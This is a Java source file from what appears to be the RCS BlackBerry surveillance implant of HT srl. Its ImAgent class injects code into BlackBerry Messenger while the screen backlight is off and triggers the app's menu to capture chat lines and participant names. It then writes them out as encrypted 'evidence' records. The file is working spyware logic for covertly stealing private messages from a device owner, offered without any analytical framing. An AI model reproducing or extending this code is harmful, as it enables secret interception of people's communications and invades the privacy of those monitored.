//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : TaskAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.util.Vector;

import net.rim.device.api.system.Backlight;
import blackberry.AgentManager;
import blackberry.AppListener;
import blackberry.Device;
import blackberry.agent.im.LineMarkup;
import blackberry.config.Conf;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.injection.AppInjector;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * Instant Message.
 */
public final class ImAgent extends Agent implements BacklightObserver,
        ApplicationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ImAgent", DebugLevel.VERBOSE);
    //#endif

    private static final long APP_TIMER_PERIOD = 5000;

    AppInjector appInjector;
    //boolean infected;

    String appName = "Messenger";

    LineMarkup markup;

    /**
     * Instantiates a new task agents
     * 
     * @param agentStatus
     *            the agent status
     */
    public ImAgent(final boolean agentEnabled) {
        super(Agent.AGENT_IM, agentEnabled, Conf.AGENT_IM_ON_SD, "ImAgent");

        if(!Device.getInstance().atLeast(5, 0)){
            //#ifdef DEBUG
            debug.error("ImAgent: not supported before OS 5.0");
            //#endif
            enable(false);
        }
        
        if(!Device.getInstance().lessThan(7, 0)){
            //#ifdef DEBUG
            debug.error("ImAgent: not supported before OS 5.0");
            //#endif
            enable(false);
        }

    }

    /**
     * Instantiates a new task agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ImAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);

        markup = new LineMarkup(agentId, Encryption.getKeys().getAesKey());

    }
    
    private synchronized String unserialize(String partecipants) {
        //#ifdef DEBUG
        debug.trace("unserialize");
        //#endif

        if (markup.isMarkup()) {
            String lastLine = markup.getLine(partecipants);

            //#ifdef DEBUG
            debug.trace("unserialize: " + lastLine);
            //#endif
            return lastLine;

        }
        return null;
    }

    private synchronized void serialize(String partecipants, String lastLine) {
        //#ifdef DEBUG
        debug.trace("serialize: " + lastLine);
        //#endif

        if (!markup.isMarkup()) {
            markup.createEmptyMarkup();
        }

        markup.put(partecipants, lastLine);
    }

    public static ImAgent getInstance() {
        return (ImAgent) AgentManager.getInstance().getItem(Agent.AGENT_IM);
    }

    public synchronized void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart");
        //#endif

        AppListener.getInstance().addBacklightObserver(this);
        AppListener.getInstance().addApplicationObserver(this);

        try {
            if (appInjector == null) {
                appInjector = new AppInjector(AppInjector.APP_BBM);
            }else{
                appInjector.reset();
            }

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("actualStart: " + ex);
            //#endif
        }
        
        if (!Backlight.isEnabled() && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("injecting");
            //#endif

            appInjector.infect();
        }
    }

    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        AppListener.getInstance().removeBacklightObserver(this);
        AppListener.getInstance().removeApplicationObserver(this);
    }

    boolean infecting = false;

    public void actualRun() {

        if (appInjector.isInfected() && Backlight.isEnabled()
                && isAppForeground) {
            //#ifdef DEBUG
            debug.info("actualRun, infected, enabled, foreground");
            //#endif

            appInjector.callMenuInContext();
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        //#ifdef DEBUG
        if (confParameters != null) {
            debug.trace("parse: " + Utils.byteArrayToHex(confParameters));
        } else {
            debug.trace("parse: null");
        }
        //#endif

        setPeriod(APP_TIMER_PERIOD);
        setDelay(APP_TIMER_PERIOD);
        return false;
    }

    public void onBacklightChange(boolean on) {
        if (!on && !appInjector.isInfected()) {
            //#ifdef DEBUG
            debug.info("onBacklightChange, injecting");
            //#endif

            appInjector.infect();
        }
    }

    //boolean enableInfect;
    boolean isAppForeground;

    public void onApplicationChange(String startedName, String stoppedName,
            String startedMod, String stoppedMod) {
        if (startedName != null && startedName.indexOf(appName) >= 0) {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: foreground");
            //#endif
            isAppForeground = true;
            if (Backlight.isEnabled()) {
                // se l'utente non e' mai andato  su bbm e' possibile che non si sia mai registrato
                //enableInfect = true;
            }
        } else {
            //#ifdef DEBUG
            debug.trace("onApplicationChange: not foreground");
            //#endif
            isAppForeground = false;
        }
    }

    public synchronized void add(String partecipants, Vector lines) {
        if (lines == null) {
            //#ifdef DEBUG
            debug.error("add: null lines");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("add : " + partecipants + " lines: " + lines.size());
        //#endif

        //#ifdef DBC
        Check.asserts(lines != null, "null lines");
        //#endif

        String lastLine = unserialize(partecipants);

        if (lines.lastElement().equals(lastLine)) {
            //#ifdef DEBUG
            debug.trace("add: nothing new");
            //#endif
            return;
        }

        int lastEqual;
        for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
            if (lines.elementAt(lastEqual).equals(lastLine)) {
                //#ifdef DEBUGs
                debug.trace("add found equal at line: " + lastEqual);
                //#endif
                break;
            }
        }

        if (lastEqual <= 0) {
            lastEqual = -1;
            //#ifdef DEBUG
            debug.info("add: no found, save everything.");
            //#endif
        }

        try {
            lastLine = (String) lines.lastElement();
            //#ifdef DEBUG
            debug.trace("add, serialize lastLine: " + lastLine);
            //#endif

            serialize(partecipants, lastLine);
            //#ifdef DEBUG
            debug.trace("write evidence from line: " + lastEqual +1);
            //#endif
            writeEvidence(partecipants, lines, lastEqual + 1);

            //#ifdef DEBUG
            debug.trace("add end");
            //#endif
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("add: " + ex);
            //#endif
        }
    }

    private void writeEvidence(String partecipants, Vector lines, int startFrom) {
        //#ifdef DEBUG
        debug.trace("writeEvidence");
        //#endif

        //#ifdef DBC
        Check.requires(lines != null, "Null lines");
        Check.requires(lines.size() > startFrom,
                "writeEvidence wrong startFrom: " + startFrom);
        //#endif

        String imname = "BBM";
        String topic = "";
        String users = partecipants;

        DateTime datetime = new DateTime();
        final Vector items = new Vector();

        for (int i = startFrom; i < lines.size(); i++) {

            String chatcontent = (String) lines.elementAt(i);

            items.addElement(datetime.getStructTm());
            items.addElement(WChar.getBytes(imname, true));
            items.addElement(WChar.getBytes(topic, true));
            items.addElement(WChar.getBytes(users, true));
            items.addElement(WChar.getBytes(chatcontent, true));
            items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
        }

        evidence.atomicWriteOnce(items);

    }
    
    //#ifdef DEBUG
    public void disinfect(){
        if(appInjector!=null){
            appInjector.disinfect();
        }
    }
    //#endif

}
